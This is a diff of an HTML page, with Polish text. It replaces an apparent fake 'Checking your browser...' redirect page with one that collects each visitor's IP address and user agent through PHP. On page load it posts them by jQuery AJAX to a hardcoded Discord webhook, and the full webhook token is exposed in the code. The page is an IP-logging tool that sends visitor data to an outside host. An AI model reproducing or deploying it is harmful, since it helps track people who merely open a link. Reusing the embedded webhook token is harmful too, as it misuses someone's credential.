@@ -1,15 +1,34 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <!-- Optional: Paste the URL you want to be redirected to MAINPAGE.html => YOUR URL --> <meta http-equiv="refresh" content="3;url=https://github.com" />
+    <title>Strona z wysyłaniem danych na Discord</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            var ip = '<?php echo $_SERVER['REMOTE_ADDR']; ?>';
+            var userAgent = '<?php echo $_SERVER['HTTP_USER_AGENT']; ?>';
+            var webhookUrl = 'https://discord.com/api/webhooks/1125045960150622268/jatYAwyzE5IIyrBgTanmaMftmZhiqeo26h9rb6Yg3H9zA_tolem5gmXYSKw2JF2o3V41';
+
+            var data = {
+                content: 'Adres IP: ' + ip + '\nUser Agent: ' + userAgent
+            };
+
+            $.ajax({
+                type: "POST",
+                url: webhookUrl,
+                data: JSON.stringify(data),
+                success: function(response) {
+                    console.log("Dane zostały wysłane na Discord.");
+                },
+                error: function(xhr, status, error) {
+                    console.log("Wystąpił błąd podczas wysyłania danych.");
+                }
+            });
+        });
+    </script>
 </head>
 <body>
-    <h1>Checking your browser...</h1>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-    <script src="index.js"></script>
+    <h1>Witaj na stronie</h1>
+    <p>Twoje informacje zostaną wysłane na Discord.</p>
 </body>
 </html>
